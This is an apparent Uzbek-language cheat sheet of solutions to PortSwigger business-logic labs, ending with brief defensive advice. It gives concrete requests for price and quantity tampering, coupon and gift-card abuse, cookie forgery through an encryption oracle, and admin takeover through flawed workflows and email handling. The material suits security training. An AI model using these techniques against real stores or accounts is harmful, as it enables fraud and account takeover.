# Business Logic (Logic Flaws) — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Bu zaifliklarni avtomat tool topolmaydi — faqat ilova mantig'ini
> buzasan. Nishon: arzonga/tekinga olish yoki admin bo'lish.

### Excessive trust in client-side controls — APPRENTICE
`price` parametri client'dan keladi → o'zgartirasan.
```
POST /cart → price=1
```

### High-level logic vulnerability (manfiy miqdor) — APPRENTICE
`quantity` manfiy bo'lishi mumkin → umumiy narx manfiy.
```
POST /cart → quantity=-...
```
> Jacket'ni normal qo'sh, boshqa mahsulotning manfiy miqdori bilan jami < store credit qil.

### Low-level logic flaw (integer overflow) — PRACTITIONER
`quantity` 2 xonali → Intruder bilan 99 ni ko'p marta qo'shib `2147483647` dan oshirasan → wrap.
```
Intruder: quantity=99, null payloads × 323, max concurrent=1
→ keyin 47 jacket ≈ -$1221.96 → boshqa mahsulot bilan 0..100 oralig'iga keltir
```

### Inconsistent security controls — PRACTITIONER
Ro'yxatdan o'z emailing bilan o't, keyin email'ni `@dontwannacry.com` ga o'zgartirasan.
```
register: you@your-domain → confirm → My account → email = x@dontwannacry.com → /admin
```

### Flawed enforcement of business rules (coupon) — APPRENTICE
Ikki kupon (`NEWCUST5`, `SIGNUP30`) — bir xilini ketma-ket ishlatib bo'lmaydi, lekin
**almashtirib** cheksiz ishlatasan.
```
NEWCUST5 → SIGNUP30 → NEWCUST5 → SIGNUP30 ... (total < store credit)
```

### Infinite money — EXPERT
$10 gift card + `SIGNUP30` (30%) → har sikl $3 foyda. Burp macro bilan avtomatlashtirasan.
```
Session handling macro: cart → coupon → checkout → order-confirmation (gift code extract) → redeem
Intruder: GET /my-account, null payloads × 412, max concurrent=1
```

### Auth bypass via encryption oracle — EXPERT
`notification` cookie encryption oracle beradi. `stay-logged-in` = `username:timestamp`.
"Invalid email address: " (23 bayt) prefiksni block boundary bilan kesib `administrator:<ts>`
yasaysan → `stay-logged-in` ga qo'y, session'ni o'chir.

### Auth bypass via flawed state machine — PRACTITIONER
Login'dan keyingi `GET /role-selector` so'rovini DROP qilasan → rol default admin bo'ladi.
```
POST /login forward → GET /role-selector DROP → bosh sahifa → /admin
```

### Email parsing discrepancy (UTF-7) — PRACTITIONER
Validator va mail kutubxona emailни har xil parse qiladi. Faqat `@ginandjuice.shop` ruxsat →
UTF-7 encoded local part bilan confirmation'ni exploit serverga yo'naltirasan, `@ginandjuice.shop`
validatsiyadan o'tadi.

### Inconsistent handling of exceptional input (truncation) — PRACTITIONER
Email 255 belgida kesiladi → `dontwannacry.com` ni subdomen qilib, `m` 255-belgi bo'ladigan uzun
email yasaysan → kesilgach `@dontwannacry.com` bo'lib qoladi.
```
very-long-prefix....@dontwannacry.com.<your-email-domain>   (m = 255-chi belgi)
```

### Weak isolation on dual-use endpoint — PRACTITIONER
Change-password'dan `current-password` ni olib tashlaysan + `username=administrator`.
```
POST /my-account/change-password
username=administrator&new-password-1=x&new-password-2=x    (current-password YO'Q)
```

### Insufficient workflow validation — APPRENTICE
Order confirmation so'rovini to'lovsiz replay qilasan.
```
GET /cart/order-confirmation?order-confirmation=true    (jacket cart'da, to'lov o'tkazilmaydi)
```

---

### Eslatma
Savol ber: "nega dasturchi bu qiymatga ishondi?" Manfiy son, overflow, qadam tashlash, ikki marta
ishlatish, tip almashtirish. Himoya: server-side invariant tekshiruv, workflow majburlash.
Umumiy: bu papka README.
